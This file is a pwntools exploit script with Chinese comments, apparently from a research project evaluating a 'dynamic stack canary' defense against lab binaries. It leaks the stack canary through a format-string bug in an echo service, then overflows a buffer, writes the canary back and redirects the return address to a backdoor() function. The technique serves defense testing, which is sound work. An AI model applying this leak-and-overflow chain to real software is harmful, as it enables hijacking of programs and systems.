# Copyright 2026 DynamicCanaryProject Authors
#
# 文件名: exp_bypass.py
# 功能描述: 动态 Canary 绕过攻击对比验证脚本。
#
#           利用格式化字符串漏洞（echo_service）配合栈溢出漏洞（vuln_service）
#           对基线版本（bypass_baseline）和动态 Canary 保护版本（bypass_protected）
#           发起两阶段绕过攻击：
#             战术一：信息泄露 —— 通过 %N$p 格式化字符串读取栈上的 Canary 值。
#             战术二：伪造现场 —— 将窃取到的 Canary 原样填回 Payload，
#                     企图骗过校验器并劫持返回地址至 backdoor()。
#
#           预期结果：
#             - bypass_baseline  : 因静态 Canary 固定不变，两步攻击均可成功。
#             - bypass_protected : 动态 Canary 每次生成不同值且与函数绑定，
#               即使泄露了 Canary，依旧会在校验时被检测到并拦截。
#
# 用法: python3 exp_bypass.py          # 测试基线版本
#        python3 exp_bypass.py prot     # 测试动态 Canary 保护版本
#
# 依赖工具: pwntools
# 作者: 陈文嘉
# 创建日期: 2026-04-15

from pwn import *
import sys, time

# context.log_level = 'debug'
context.arch = 'amd64'
is_prot = len(sys.argv) > 1 and sys.argv[1] == 'prot'
target = '../output/bypass_protected' if is_prot else '../output/bypass_baseline'
print(f"================ 正在测试目标: {target} ================")

elf = ELF(target)
p = process(target)
backdoor_addr = elf.symbols['backdoor']

# ================= 战术阶段一：声东击西（信息泄露） =================
p.recvuntil(b": ")
# print(p.recvuntil(b": ").decode('utf-8', 'ignore'), end='')
p.send(b"1\n") # 选择 1. Echo 服务

# 在 64位 Linux 下，Canary 通常在栈的较深处。
# 这里的 %15$p 甚至 %17$p 是格式化字符串的偏移量，我们用它把栈上的数据打印出来。
# (注意：如果基线版跑不通，可能需要把 15 改成 13, 17 或 19 试试)
if is_prot:
    print(p.recvuntil(b": ").decode('utf-8', 'ignore'), end='')
else:
    p.recvuntil(b": ")

# p.send(b"%10$p %11$p %12$p %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p %21$p %22$p %23$p %24$p %25$p\n") 

if is_prot:
    # 针对动态金丝雀的窃取
    p.send(b"%15$p\n")
else:
    # 针对静态金丝雀的窃取
    p.send(b"%19$p\n")

p.recvuntil("系统回显: ".encode())
leak_str = p.recvline().strip().decode('utf-8')
#print(f"[*] 栈数据大揭秘:")
'''for i, val in enumerate(leak_str.split(),start=10):
    print(f" %{i}$p = {val}")
exit(0) # 打印完直接退出，我们先不执行第二步
'''
# 解析出泄露的 Canary 值
leaked_canary = int(leak_str, 16)
print(f"[+] 战术一成功！从 Echo 服务中窃取到 Canary 值: {hex(leaked_canary)}")

# ================= 战术阶段二：伪造现场（栈溢出） =================
p.recvuntil(b": ")
p.send(b"2\n") # 选择 2. Vuln 服务
time.sleep(0.5)

# 构造终极 Payload：
# 在基线版本中：buf(32) + padding(8) = 40 字节到达 Canary 槽位
# (如果在测试中发现不对，可以把 padding 调为 0 或 16)
padding_to_canary = 40

if is_prot:
    # 你的动态保护版：虽然黑客塞入了窃取的 Canary，但这是徒劳的！
    payload = b'A' * padding_to_canary + p64(leaked_canary) + b'B' * 8 + p64(backdoor_addr)
else:
    # 基线版：黑客把窃取的 Canary 原封不动地填回去，骗过系统的校验！
    payload = b'A' * padding_to_canary + p64(leaked_canary) + b'B' * 8 + p64(backdoor_addr)

# print(p.recvuntil(b": ").decode('utf-8', 'ignore'), end='')
p.recvuntil(b": ")
p.send(payload)
time.sleep(0.5)

# 尝试读取后门输出或拦截报错
print("\n--- 攻击结果 ---")
try:
    print(p.recvall(timeout=1).decode('utf-8', 'ignore'))
except:
    pass